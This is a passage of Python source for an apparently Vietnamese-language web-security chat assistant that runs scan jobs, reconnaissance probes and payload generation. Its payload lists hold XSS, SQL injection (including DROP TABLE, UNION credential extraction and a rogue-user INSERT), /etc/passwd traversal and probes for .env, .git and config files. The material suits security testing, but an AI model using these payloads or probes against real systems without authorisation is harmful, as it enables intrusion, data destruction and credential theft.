            scan_system = EnhancedScanSystem()
            
            status = scan_system.get_job_status(job_id)
            
            if not status:
                return ChatResponse(
                    message=f"[ERROR] **Job không tìm thấy:** {job_id}",
                    command=ChatCommand.SCAN_STATUS,
                    suggestions=[
                        "Kiểm tra Job ID",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            # Create status response
            response_message = "[CHART] **Scan Job Status**\n\n"
            response_message += f"[ID] **Job ID:** {status['job_id']}\n"
            response_message += f"[LOCATION] **Target:** {status['target_url']}\n"
            response_message += f"[CHART_UP] **Status:** {status['status'].upper()}\n"
            response_message += f"[REFRESH] **Current Stage:** {status['current_stage'].replace('_', ' ').title()}\n"
            response_message += f"⏳ **Progress:** {status['progress']}%\n"
            response_message += f"🕐 **Created:** {status['created_at']}\n"
            
            if status['started_at']:
                response_message += f"🚀 **Started:** {status['started_at']}\n"
            
            if status['completed_at']:
                response_message += f"[OK] **Completed:** {status['completed_at']}\n"
            
            if status['error_message']:
                response_message += f"[ERROR] **Error:** {status['error_message']}\n"
            
            if status['summary']:
                response_message += f"[NOTE] **Summary:** {status['summary']}\n"
            
            response_message += f"[SCAN] **Findings:** {status['findings_count']}\n\n"
            
            # Add progress bar
            progress_bar = "█" * (status['progress'] // 10) + "░" * (10 - status['progress'] // 10)
            response_message += f"Progress: [{progress_bar}] {status['progress']}%\n\n"
            
            # Add suggestions based on status
            suggestions = []
            if status['status'] == 'completed':
                suggestions.append(f"/scan-results {job_id}")
                suggestions.append("View detailed results")
            elif status['status'] == 'running':
                suggestions.append(f"/scan-status {job_id}")
                suggestions.append("Check again later")
            elif status['status'] == 'failed':
                suggestions.append("Try scanning again")
                suggestions.append("/help")
            else:
                suggestions.append(f"/scan-status {job_id}")
                suggestions.append("/help")
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN_STATUS,
                suggestions=suggestions
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi lấy status: {str(e)}",
                command=ChatCommand.SCAN_STATUS,
                suggestions=["Hãy thử lại", "Kiểm tra Job ID", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _handle_scan_results_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan-results"""
        try:
            # Extract job_id from message
            parts = message.split()
            if len(parts) < 2:
                return ChatResponse(
                    message="[ERROR] **Lỗi:** Vui lòng cung cấp Job ID\n\n**Ví dụ:** `/scan-results job_abc123`",
                    command=ChatCommand.SCAN_RESULTS,
                    suggestions=[
                        "Cung cấp Job ID hợp lệ",
                        "Ví dụ: /scan-results job_abc123",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            job_id = parts[1]
            
            # Get job results from enhanced scan system
            from app.core.enhanced_scan_system import EnhancedScanSystem
            scan_system = EnhancedScanSystem()
            
            results = scan_system.get_job_results(job_id)
            
            if not results:
                return ChatResponse(
                    message=f"[ERROR] **Job không tìm thấy hoặc chưa hoàn thành:** {job_id}",
                    command=ChatCommand.SCAN_RESULTS,
                    suggestions=[
                        "Kiểm tra Job ID",
                        f"/scan-status {job_id}",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            # Create results response
            response_message = "[TARGET] **Scan Results**\n\n"
            response_message += f"[ID] **Job ID:** {results['job_id']}\n"
            response_message += f"[LOCATION] **Target:** {results['target_url']}\n"
            response_message += f"[TIME] **Duration:** {results['scan_duration']}\n\n"
            
            response_message += "## [NOTE] **Executive Summary**\n"
            response_message += f"{results['summary']}\n\n"
            
            # Findings summary
            findings = results['findings']
            if findings:
                response_message += f"## [SCAN] **Findings Summary**\n"
                response_message += f"• **Total Findings:** {len(findings)}\n"
                
                # Group by severity
                severity_counts = {}
                for finding in findings:
                    severity = finding.get('severity', 'Unknown')
                    severity_counts[severity] = severity_counts.get(severity, 0) + 1
                
                for severity, count in severity_counts.items():
                    response_message += f"• **{severity}:** {count}\n"
                response_message += "\n"
                
                # Show top findings
                response_message += "## [ALERT] **Top Findings**\n"
                for i, finding in enumerate(findings[:5], 1):
                    response_message += f"**{i}. {finding.get('type', 'Unknown')}**\n"
                    response_message += f"• **Severity:** {finding.get('severity', 'Unknown')}\n"
                    response_message += f"• **Path:** {finding.get('path', 'N/A')}\n"
                    response_message += f"• **Tool:** {finding.get('tool', 'Unknown')}\n"
                    response_message += f"• **Evidence:** {finding.get('evidence', 'N/A')[:100]}...\n\n"
                
                if len(findings) > 5:
                    response_message += f"... và {len(findings) - 5} findings khác\n\n"
            else:
                response_message += "## [OK] **No Vulnerabilities Found**\n"
                response_message += "Target appears to be secure based on automated scanning.\n\n"
            
            # Raw outputs summary
            raw_outputs = results.get('raw_outputs', {})
            if raw_outputs:
                response_message += "## [TOOL] **Tools Used**\n"
                for tool_category, tool_results in raw_outputs.items():
                    if tool_results:
                        response_message += f"• **{tool_category.replace('_', ' ').title()}:** "
                        if isinstance(tool_results, dict):
                            available_tools = [tool for tool, result in tool_results.items() if result.get('available', False)]
                            response_message += f"{', '.join(available_tools)}\n"
                        else:
                            response_message += "Completed\n"
                response_message += "\n"
            
            # Add suggestions
            suggestions = [
                f"/scan-status {job_id}",
                "Download full report",
                "Request manual verification",
                "/help"
            ]
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN_RESULTS,
                scan_results=results,
                suggestions=suggestions
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi lấy results: {str(e)}",
                command=ChatCommand.SCAN_RESULTS,
                suggestions=["Hãy thử lại", "Kiểm tra Job ID", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _handle_scan_cancel_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan-cancel"""
        try:
            # Extract job_id from message
            parts = message.split()
            if len(parts) < 2:
                return ChatResponse(
                    message="[ERROR] **Lỗi:** Vui lòng cung cấp Job ID\n\n**Ví dụ:** `/scan-cancel job_abc123`",
                    command=ChatCommand.SCAN_CANCEL,
                    suggestions=[
                        "Cung cấp Job ID hợp lệ",
                        "Ví dụ: /scan-cancel job_abc123",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            job_id = parts[1]
            
            # Cancel job using enhanced scan system
            from app.core.enhanced_scan_system import EnhancedScanSystem
            scan_system = EnhancedScanSystem()
            
            # Check if job exists
            status = scan_system.get_job_status(job_id)
            if not status:
                return ChatResponse(
                    message=f"[ERROR] **Job không tìm thấy:** {job_id}",
                    command=ChatCommand.SCAN_CANCEL,
                    suggestions=[
                        "Kiểm tra Job ID",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            # Check if job can be cancelled
            if status['status'] in ['completed', 'failed', 'cancelled']:
                return ChatResponse(
                    message=f"[WARNING] **Job không thể hủy:** {job_id}\n\n**Status:** {status['status']}",
                    command=ChatCommand.SCAN_CANCEL,
                    suggestions=[
                        f"/scan-status {job_id}",
                        "Job đã hoàn thành hoặc thất bại",
                        "/help"
                    ]
                )
            
            # Cancel the job
            job = scan_system.active_jobs[job_id]
            job.status = job.status.CANCELLED
            job.completed_at = time.strftime('%Y-%m-%d %H:%M:%S')
            
            response_message = "[STOP] **Job Cancelled**\n\n"
            response_message += f"[ID] **Job ID:** {job_id}\n"
            response_message += f"[LOCATION] **Target:** {status['target_url']}\n"
            response_message += f"[CHART_UP] **Status:** CANCELLED\n"
            response_message += f"🕐 **Cancelled At:** {job.completed_at}\n\n"
            response_message += "Job đã được hủy thành công."
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN_CANCEL,
                suggestions=[
                    "Start new scan",
                    "/help",
                    "Check other jobs"
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi hủy job: {str(e)}",
                command=ChatCommand.SCAN_CANCEL,
                suggestions=["Hãy thử lại", "Kiểm tra Job ID", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _handle_help_command(self) -> ChatResponse:
        """Xử lý lệnh /help"""
        help_message = "[BOOK] **Hướng dẫn sử dụng Chat Assistant**\n\n"
        help_message += "## [TOOL] **Lệnh Scan Chuyên Nghiệp**\n"
        help_message += "• `/scan <URL>` - Bắt đầu scan chuyên nghiệp với pipeline đầy đủ\n"
        help_message += "• `/scan-status <job_id>` - Kiểm tra trạng thái scan job\n"
        help_message += "• `/scan-results <job_id>` - Xem kết quả scan chi tiết\n"
        help_message += "• `/scan-cancel <job_id>` - Hủy scan job đang chạy\n\n"
        
        help_message += "## [TARGET] **Lệnh Payload**\n"
        help_message += "• `/payload <type> <URL>` - Tạo payload cho vulnerability type\n"
        help_message += "  - Types: xss, sql_injection, misconfig, idor\n"
        help_message += "  - Ví dụ: `/payload xss http://testphp.vulnweb.com`\n\n"
        
        help_message += "## [CHAT] **Giao tiếp tự nhiên**\n"
        help_message += "• Chào hỏi: 'Hi', 'Hello', 'Chào bạn'\n"
        help_message += "• Hỏi khả năng: 'Bạn có thể làm gì?', 'What can you do?'\n"
        help_message += "• Yêu cầu scan: 'Hãy scan lỗ hỏng của web http://...'\n"
        help_message += "• Yêu cầu payload: 'Cho tôi payload XSS để test'\n\n"
        
        help_message += "## 🚀 **Ví dụ sử dụng**\n"
        help_message += "1. **Scan chuyên nghiệp:**\n"
        help_message += "   `/scan http://testphp.vulnweb.com`\n"
        help_message += "   → Sẽ tạo job với ID, dùng `/scan-status <job_id>` để theo dõi\n\n"
        
        help_message += "2. **Tạo payload:**\n"
        help_message += "   `/payload xss http://testphp.vulnweb.com`\n"
        help_message += "   → Tạo payload XSS phù hợp với target\n\n"
        
        help_message += "3. **Giao tiếp tự nhiên:**\n"
        help_message += "   'Hãy scan lỗ hỏng của web http://testphp.vulnweb.com'\n"
        help_message += "   → Tự động hiểu và thực hiện scan\n\n"
        
        help_message += "## [SCAN] **Scan Pipeline**\n"
        help_message += "1. **Validation** - Kiểm tra URL và allowlist\n"
        help_message += "2. **Reconnaissance** - Thu thập thông tin cơ bản\n"
        help_message += "3. **Crawling** - Khám phá URLs và parameters\n"
        help_message += "4. **Directory Fuzzing** - Tìm kiếm files và directories\n"
        help_message += "5. **Vulnerability Scanning** - Quét lỗ hổng với nuclei, nikto, sqlmap, dalfox\n"
        help_message += "6. **Result Aggregation** - Tổng hợp kết quả\n"
        help_message += "7. **LLM Enrichment** - Phân tích và tạo báo cáo\n\n"
        
        help_message += "## [SECURITY] **Bảo mật**\n"
        help_message += "• Chỉ scan targets trong allowlist\n"
        help_message += "• Tất cả tools chạy trong sandbox\n"
        help_message += "• Không thực hiện destructive actions\n"
        help_message += "• Timeout và resource limits\n\n"
        
        help_message += "**Sử dụng `/help` để xem lại hướng dẫn này!**"
        help_message += "• Kiểm tra response để xác nhận lỗ hổng\n"
        help_message += "• Báo cáo lỗ hổng một cách có trách nhiệm\n"
        
        return ChatResponse(
            message=help_message,
            command=ChatCommand.HELP,
            suggestions=[
                "Thử /payload xss http://testphp.vulnweb.com",
                "Thử /scan http://demo.testfire.net",
                "Xem ví dụ sử dụng",
                "Bắt đầu với lời chào /"
            ]
        )
    
    async def _handle_greeting_command(self) -> ChatResponse:
        """Xử lý lệnh chào"""
        greeting_message = "[HELLO] **Xin chào! Tôi là Chat Assistant với RAG về lỗ hổng bảo mật!**\n\n"
        
        greeting_message += "[HELP] **Tôi có thể giúp bạn:**\n"
        greeting_message += "• [PAYLOAD] Tạo payloads cho các loại lỗ hổng\n"
        greeting_message += "• [SCAN] Scan và phân tích lỗ hổng\n"
        greeting_message += "• [INFO] Cung cấp thông tin về bảo mật\n"
        greeting_message += "• [SECURITY] Hướng dẫn khắc phục lỗ hổng\n\n"
        
        greeting_message += "**🚀 Bắt đầu ngay:**\n"
        greeting_message += "• `/payload xss http://testphp.vulnweb.com`\n"
        greeting_message += "• `/scan http://demo.testfire.net`\n"
        greeting_message += "• `/help` để xem hướng dẫn đầy đủ\n\n"
        
        greeting_message += "**[IDEA] Gợi ý:**\n"
        greeting_message += "• Sử dụng RAG để có thông tin chính xác\n"
        greeting_message += "• LLM phân tích kết quả scan\n"
        greeting_message += "• URL tham chiếu để giảm ảo giác\n"
        greeting_message += "• Giao tiếp tự nhiên như con người\n"
        
        return ChatResponse(
            message=greeting_message,
            command=ChatCommand.GREETING,
            suggestions=[
                "Thử /payload xss http://testphp.vulnweb.com",
                "Thử /scan http://demo.testfire.net",
                "Xem hướng dẫn /help",
                "Tạo payload SQL injection"
            ]
        )
    
    async def _handle_natural_conversation(self, message: str) -> ChatResponse:
        """Xử lý hội thoại tự nhiên"""
        try:
            # Use LLM để hiểu intent
            intent = await self._understand_intent(message)
            
            if intent == "payload_request":
                return await self._handle_payload_command(f"/payload {message}")
            elif intent == "scan_request":
                return await self._handle_scan_command(f"/scan {message}")
            elif intent == "help_request":
                return await self._handle_help_command()
            else:
                # General conversation
                response = await self._generate_natural_response(message)
                return ChatResponse(
                    message=response,
                    command=ChatCommand.UNKNOWN,
                    suggestions=[
                        "Thử /payload xss http://testphp.vulnweb.com",
                        "Thử /scan http://demo.testfire.net",
                        "Xem hướng dẫn /help",
                        "Tạo payload cho lỗ hổng"
                    ]
                )
                
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi: {str(e)}",
                command=ChatCommand.UNKNOWN,
                suggestions=["Hãy thử lại", "Sử dụng /help để xem hướng dẫn"]
            )
    
    async def _understand_intent(self, message: str) -> str:
        """Hiểu intent từ message tự nhiên"""
        try:
            prompt = f"""
            Phân tích message này và xác định intent:
            Message: "{message}"
            
            Các intent có thể:
            - payload_request: Yêu cầu tạo payload
            - scan_request: Yêu cầu scan lỗ hổng
            - help_request: Yêu cầu giúp đỡ
            - general_conversation: Hội thoại chung
            
            Trả về chỉ tên intent.
            """
            
            response = await self.llm_client.generate_content(prompt, max_output_tokens=50)
            return response.strip().lower()
            
        except Exception as e:
            print(f"Error understanding intent: {e}")
            return "general_conversation"
    
    async def _generate_natural_response(self, message: str) -> str:
        """Tạo response tự nhiên với enhanced RAG"""
        try:
            # Get enhanced RAG context
            rag_context = self._get_enhanced_rag_context_for_natural_response(message)
            
            # Check for greeting patterns
            greeting_patterns = ['chào', 'hello', 'hi', 'hey', 'xin chào', 'chào bạn']
            if any(pattern in message.lower() for pattern in greeting_patterns):
                return await self._generate_greeting_response(message, rag_context)
            
            # Check for capability questions
            capability_patterns = ['làm được gì', 'có thể làm gì', 'tính năng', 'chức năng', 'giúp gì']
            if any(pattern in message.lower() for pattern in capability_patterns):
                return await self._generate_capability_response(message, rag_context)
            
            prompt = f"""
            Bạn là Chat Assistant chuyên về bảo mật web với kiến thức sâu rộng về XSS, SQL Injection, Misconfig, và IDOR. 
            Hãy trả lời message này một cách tự nhiên, chính xác và hữu ích:
            
            Message: "{message}"
            
            Thông tin tham khảo từ RAG tổng hợp:
            {rag_context}
            
            Hãy:
            - Trả lời tự nhiên như con người
            - Cung cấp thông tin hữu ích về bảo mật (sử dụng thông tin từ RAG)
            - Gợi ý các lệnh có thể sử dụng (/scan, /payload, /help)
            - Giữ tone thân thiện và chuyên nghiệp
            - Bao gồm URLs tham khảo và ví dụ cụ thể
            - Tránh ảo giác bằng cách dựa vào thông tin RAG
            """
            
            response = self.llm_client.chat(prompt, max_output_tokens=500)
            return response
            
        except Exception as e:
            print(f"Error generating natural response: {e}")
            return "Xin lỗi, tôi không hiểu rõ yêu cầu của bạn. Hãy thử sử dụng /help để xem hướng dẫn."
    
    async def _generate_greeting_response(self, message: str, rag_context: str) -> str:
        """Tạo response chào hỏi tự nhiên"""
        try:
            prompt = f"""
            Bạn là Chat Assistant chuyên về bảo mật web. Hãy trả lời lời chào một cách thân thiện và tự nhiên:
            
            Message: "{message}"
            
            Hãy trả lời:
            - Chào lại một cách thân thiện
            - Giới thiệu ngắn gọn về khả năng của bạn
            - Gợi ý một số lệnh hữu ích
            - Giữ tone vui vẻ và chuyên nghiệp
            
            Ví dụ: "Chào bạn! Tôi là Chat Assistant chuyên về bảo mật web. Tôi có thể giúp bạn:
            - Quét lỗ hổng bảo mật (/scan)
            - Tạo payload cho các loại lỗ hổng (/payload)
            - Phân tích và đánh giá bảo mật
            - Hướng dẫn sử dụng (/help)
            
            Bạn muốn thử gì trước?"
            """
            
            response = self.llm_client.chat(prompt, max_output_tokens=300)
            return response
            
        except Exception as e:
            return "Chào bạn! Tôi là Chat Assistant chuyên về bảo mật web. Tôi có thể giúp bạn quét lỗ hổng, tạo payload, và phân tích bảo mật. Hãy thử /help để xem hướng dẫn!"
    
    async def _generate_capability_response(self, message: str, rag_context: str) -> str:
        """Tạo response về khả năng"""
        try:
            prompt = f"""
            Bạn là Chat Assistant chuyên về bảo mật web. Hãy trả lời câu hỏi về khả năng một cách chi tiết và hữu ích:
            
            Message: "{message}"
            
            Thông tin tham khảo từ RAG:
            {rag_context}
            
            Hãy trả lời:
            - Liệt kê các khả năng chính của bạn
            - Giải thích ngắn gọn từng khả năng
            - Đưa ra ví dụ cụ thể
            - Gợi ý cách sử dụng
            
            Khả năng chính:
            1. Quét lỗ hổng bảo mật (/scan)
            2. Tạo payload cho các loại lỗ hổng (/payload)
            3. Phân tích bảo mật với LLM
            4. Hỗ trợ 4 loại lỗ hổng chính: XSS, SQL Injection, Misconfig, IDOR
            5. Giao tiếp tự nhiên bằng tiếng Việt
            """
            
            response = self.llm_client.chat(prompt, max_output_tokens=400)
            return response
            
        except Exception as e:
            return """Tôi có thể giúp bạn:

[SCAN] **Quét lỗ hổng bảo mật** (/scan)
- Quét website để tìm lỗ hổng
- Phân tích headers và response
- Đánh giá bảo mật tổng thể

[SWORD] **Tạo payload** (/payload)
- XSS payloads
- SQL Injection payloads
- Misconfig payloads
- IDOR payloads

[SECURITY] **Phân tích bảo mật**
- Sử dụng LLM để phân tích
- Đánh giá mức độ nghiêm trọng
- Đưa ra khuyến nghị khắc phục

[CHAT] **Giao tiếp tự nhiên**
- Hiểu ngôn ngữ tiếng Việt
- Trả lời câu hỏi về bảo mật
- Hướng dẫn sử dụng

Hãy thử /help để xem hướng dẫn chi tiết!"""
    
    async def _generate_enhanced_payloads(self, vulnerability_type: Optional[VulnerabilityType], target_url: Optional[str], parameter: Optional[str] = None) -> List[str]:
        """Generate enhanced payloads dựa trên vulnerability type, target URL và parameter"""
        try:
            if not vulnerability_type:
                # Generate general payloads
                return [
                    "<script>alert('XSS')</script>",
                    "' OR 1=1--",
                    "../../../etc/passwd",
                    "/admin/",
                    "admin:admin",
                    "<img src=x onerror=alert('XSS')>",
                    "'; DROP TABLE users; --",
                    "?id=1",
                    "?id=2",
                    "?id=3"
                ]
            
            # Get payloads from RAG data
            vuln_data = self.vulnerability_rag.get('vulnerability_knowledge', {}).get(vulnerability_type.value, {})
            
            payloads = []
            
            if vulnerability_type == VulnerabilityType.XSS:
                xss_types = vuln_data.get('types', {})
                for xss_type, xss_data in xss_types.items():
                    payloads.extend(xss_data.get('payloads', []))
                # Add advanced XSS payloads
                payloads.extend([
                    "<script>fetch('/admin/users').then(r=>r.text()).then(d=>alert(d))</script>",
                    "<iframe src='javascript:alert(document.cookie)'></iframe>",
                    "<object data='javascript:alert(1)'></object>",
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>"
                ])
            elif vulnerability_type == VulnerabilityType.SQL_INJECTION:
                sql_types = vuln_data.get('types', {})
                for sql_type, sql_data in sql_types.items():
                    payloads.extend(sql_data.get('payloads', []))
                # Add advanced SQL injection payloads
                payloads.extend([
                    "' OR 1=1 LIMIT 1 OFFSET 0--",
                    "' UNION SELECT username,password FROM users--",
                    "'; INSERT INTO users VALUES('hacker','password');--",
                    "' AND (SELECT COUNT(*) FROM users) > 0--",
                    "'; WAITFOR DELAY '00:00:05'--"
                ])
            elif vulnerability_type == VulnerabilityType.MISCONFIGURATION:
                misconfig_types = vuln_data.get('types', {})
                for misconfig_type, misconfig_data in misconfig_types.items():
                    payloads.extend(misconfig_data.get('payloads', []))
                # Add misconfiguration payloads
                payloads.extend([
                    "/.env",
                    "/config.php",
                    "/wp-config.php",
                    "/.git/config",
                    "/backup.sql"
                ])
            elif vulnerability_type == VulnerabilityType.IDOR:
                idor_types = vuln_data.get('types', {})
                for idor_type, idor_data in idor_types.items():
                    payloads.extend(idor_data.get('payloads', []))
                # Add IDOR payloads
                payloads.extend([
                    "?id=1", "?id=2", "?id=3",
                    "?user_id=1", "?user_id=2", "?user_id=3",
                    "?account_id=1", "?account_id=2", "?account_id=3",
                    "?order_id=1", "?order_id=2", "?order_id=3"
                ])
            
            # Remove duplicates and limit
            unique_payloads = list(set(payloads))
            return unique_payloads[:20]  # Increased to 20 payloads
            
        except Exception as e:
            print(f"Error generating enhanced payloads: {e}")
            return ["<script>alert('XSS')</script>", "' OR 1=1--", "../../../etc/passwd", "?id=1", "?id=2"]
    
    def _generate_test_urls(self, target_url: Optional[str], payloads: List[str], parameter: Optional[str] = None) -> List[str]:
        """Generate test URLs with payloads"""
        if not target_url or not payloads:
            return []
        
        test_urls = []
        param_name = parameter or "test"
        
        for payload in payloads[:5]:  # Top 5 payloads
            try:
                import urllib.parse
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{target_url}?{param_name}={encoded_payload}"
                test_urls.append(test_url)
            except:
                continue
        
        return test_urls
    
    def _get_payload_rag_context(self, vulnerability_type: str) -> str:
        """Get RAG context for payload generation"""
        try:
            if not self.kb_retriever:
                return ""
            
            # Get vulnerability-specific knowledge
            docs = self.kb_retriever.retrieve(f"{vulnerability_type} vulnerability payloads", k=2)
            if docs:
                context = "\n".join([(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:150] + "..." for doc in docs])
                return context
            
            return ""
        except Exception as e:
            return f"RAG context error: {str(e)}"
    
    async def _generate_payloads(self, vulnerability_type: Optional[VulnerabilityType], target_url: Optional[str]) -> List[str]:
        """Legacy method - redirect to enhanced version"""
        return await self._generate_enhanced_payloads(vulnerability_type, target_url)
    
    async def _perform_scan(self, target_url: str) -> Dict[str, Any]:
        """Perform comprehensive scan với subdomain discovery, robots, sitemap, static files"""
        try:
            import subprocess
            import json
            from urllib.parse import urljoin, urlparse
            
            scan_results = {
                'target_url': target_url,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'discovered_urls': [],
                'responses': [],
                'subdomains': [],
                'robots_txt': None,
                'sitemap': None,
                'static_files': [],
                'parameters': [],
                'services': {},
                'security_headers': {},
                'cookies': {},
                'csp': None
            }
            
            # 1. Scan main URL
            main_response = await self._curl_request(target_url)
            if main_response:
                scan_results['responses'].append(main_response)
                scan_results['discovered_urls'].append(target_url)
            
            # 2. Discover subdomains
            subdomains = await self._discover_subdomains(target_url)
            scan_results['subdomains'] = subdomains
            
            # 3. Check robots.txt
            robots_info = await self._check_robots_txt(target_url)
            scan_results['robots_txt'] = robots_info
            
            # 4. Check sitemap
            sitemap_info = await self._check_sitemap(target_url)
            scan_results['sitemap'] = sitemap_info
            
            # 5. Discover static files
            static_files = await self._discover_static_files(target_url)
            scan_results['static_files'] = static_files
            
            # 6. Extract parameters from URLs
            parameters = await self._extract_parameters(target_url)
            scan_results['parameters'] = parameters
            
            # 7. Identify services
            services = await self._identify_services(target_url)
            scan_results['services'] = services
            
            # 8. Analyze security headers, cookies, CSP
            if main_response and main_response.get('success'):
                headers = main_response.get('headers', {})
                scan_results['security_headers'] = self._analyze_security_headers(headers)
                scan_results['cookies'] = self._extract_cookies(headers)
                scan_results['csp'] = self._extract_csp(headers)
            
            # 9. Scan discovered URLs
            all_urls = [target_url] + subdomains + static_files
            for url in all_urls[:10]:  # Limit to 10 URLs
                if url not in [r['url'] for r in scan_results['responses']]:
                    try:
                        response = await self._curl_request(url)
                        if response:
                            scan_results['responses'].append(response)
                            scan_results['discovered_urls'].append(url)
                    except Exception as e:
                        print(f"Error scanning {url}: {e}")
            
            return scan_results
            
        except Exception as e:
            print(f"Error performing scan: {e}")
            return {
                'target_url': target_url,
                'error': str(e),
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    async def _discover_subdomains(self, target_url: str) -> List[str]:
        """Discover subdomains using common patterns"""
        try:
            from urllib.parse import urlparse
            
            parsed = urlparse(target_url)
            domain = parsed.netloc
            scheme = parsed.scheme
            
            # Common subdomains
            subdomains = [
                'www', 'admin', 'api', 'test', 'dev', 'staging', 'mail', 'ftp', 'blog', 'shop',
                'app', 'mobile', 'cdn', 'static', 'assets', 'images', 'img', 'css', 'js',
                'secure', 'ssl', 'vpn', 'remote', 'portal', 'dashboard', 'panel', 'control',
                'backup', 'old', 'new', 'beta', 'alpha', 'demo', 'sandbox', 'lab'
            ]
            
            discovered = []
            for subdomain in subdomains:
                subdomain_url = f"{scheme}://{subdomain}.{domain}"
                response = await self._curl_request(subdomain_url)
                if response and response.get('success') and response.get('status_code') in [200, 301, 302, 403]:
                    discovered.append(subdomain_url)
            
            return discovered
            
        except Exception as e:
            print(f"Error discovering subdomains: {e}")
            return []
    
    async def _check_robots_txt(self, target_url: str) -> Dict[str, Any]:
        """Check robots.txt file"""
        try:
            from urllib.parse import urljoin
            
            robots_url = urljoin(target_url, '/robots.txt')
            response = await self._curl_request(robots_url)
            
            if response and response.get('success'):
                body = response.get('body', '')
                return {
                    'url': robots_url,
                    'status_code': response.get('status_code'),
                    'content': body,
                    'disallowed_paths': self._parse_robots_txt(body),
                    'sitemap_urls': self._extract_sitemap_urls(body)
                }
            
            return None
            
        except Exception as e:
            print(f"Error checking robots.txt: {e}")
            return None
    
    async def _check_sitemap(self, target_url: str) -> Dict[str, Any]:
        """Check sitemap.xml"""
        try:
            from urllib.parse import urljoin
            
            sitemap_urls = [
                '/sitemap.xml',
                '/sitemap_index.xml',
                '/sitemaps.xml',
                '/sitemap/sitemap.xml'
            ]
            
            for sitemap_path in sitemap_urls:
                sitemap_url = urljoin(target_url, sitemap_path)
                response = await self._curl_request(sitemap_url)
                
                if response and response.get('success') and response.get('status_code') == 200:
                    return {
                        'url': sitemap_url,
                        'status_code': response.get('status_code'),
                        'content': response.get('body', ''),
                        'urls': self._parse_sitemap_xml(response.get('body', ''))
                    }
            
            return None
            
        except Exception as e:
            print(f"Error checking sitemap: {e}")
            return None
    
    async def _discover_static_files(self, target_url: str) -> List[str]:
        """Discover static files and common paths"""
        try:
            from urllib.parse import urljoin
            
            static_paths = [
                '/favicon.ico', '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
                '/.well-known/security.txt', '/.well-known/apple-app-site-association',
                '/admin/', '/login/', '/wp-admin/', '/phpmyadmin/', '/admin.php',
                '/config/', '/backup/', '/uploads/', '/files/', '/assets/',
                '/css/', '/js/', '/images/', '/img/', '/static/',
                '/.git/', '/.svn/', '/.env', '/config.php', '/wp-config.php',
                '/readme.txt', '/changelog.txt', '/license.txt'
            ]
            
            discovered = []
            for path in static_paths:
                file_url = urljoin(target_url, path)
                response = await self._curl_request(file_url)
                if response and response.get('success') and response.get('status_code') in [200, 403]:
                    discovered.append(file_url)
            
            return discovered
            
        except Exception as e:
            print(f"Error discovering static files: {e}")
            return []
    
    async def _extract_parameters(self, target_url: str) -> List[str]:
        """Extract parameters from URL"""
        try:
            from urllib.parse import urlparse, parse_qs
            
            parsed = urlparse(target_url)
            query_params = parse_qs(parsed.query)
            
            # Common parameters to look for
            common_params = [
                'id', 'user', 'page', 'search', 'q', 'query', 'category', 'type',
                'action', 'method', 'cmd', 'exec', 'file', 'path', 'dir',
                'url', 'redirect', 'return', 'next', 'callback', 'jsonp'
            ]
            
            parameters = []
            for param in query_params.keys():
                parameters.append(param)
            
            # Add common parameters that might be used
            for param in common_params:
                if param not in parameters:
                    parameters.append(f"{param}=[VALUE]")
            
            return parameters
            
        except Exception as e:
            print(f"Error extracting parameters: {e}")
            return []
    
    async def _identify_services(self, target_url: str) -> Dict[str, Any]:
        """Identify services and technologies"""
        try:
            response = await self._curl_request(target_url)
            if not response or not response.get('success'):
                return {}
            
            headers = response.get('headers', {})
            body = response.get('body', '')
            
            services = {
                'web_server': headers.get('Server', 'Unknown'),
                'content_type': headers.get('Content-Type', 'Unknown'),
                'technologies': [],
                'frameworks': [],
                'cms': None
            }
            
            # Identify technologies from headers
            server = headers.get('Server', '').lower()
            if 'apache' in server:
                services['technologies'].append('Apache')
            elif 'nginx' in server:
                services['technologies'].append('Nginx')
            elif 'iis' in server:
                services['technologies'].append('IIS')
            
            # Identify frameworks from body
            if 'wordpress' in body.lower():
                services['cms'] = 'WordPress'
            elif 'drupal' in body.lower():
                services['cms'] = 'Drupal'
            elif 'joomla' in body.lower():
                services['cms'] = 'Joomla'
            
            # Check for common frameworks
            if 'bootstrap' in body.lower():
                services['frameworks'].append('Bootstrap')
            if 'jquery' in body.lower():
                services['frameworks'].append('jQuery')
            if 'react' in body.lower():
                services['frameworks'].append('React')
            
            return services
            
        except Exception as e:
            print(f"Error identifying services: {e}")
            return {}
    
    def _analyze_security_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze security headers"""
        security_headers = {
            'present': [],
            'missing': [],
            'recommendations': []
        }
        
        # Security headers to check
        required_headers = {
            'X-Frame-Options': 'Prevents clickjacking',
            'X-Content-Type-Options': 'Prevents MIME sniffing',
            'X-XSS-Protection': 'XSS protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content security policy',
            'Referrer-Policy': 'Referrer information control',
            'Permissions-Policy': 'Feature permissions'
        }
        
        for header, description in required_headers.items():
            if header in headers:
                security_headers['present'].append({
                    'header': header,
                    'value': headers[header],
                    'description': description
                })
            else:
                security_headers['missing'].append({
                    'header': header,
                    'description': description
                })
                security_headers['recommendations'].append(f"Add {header} header: {description}")
        
        return security_headers
    
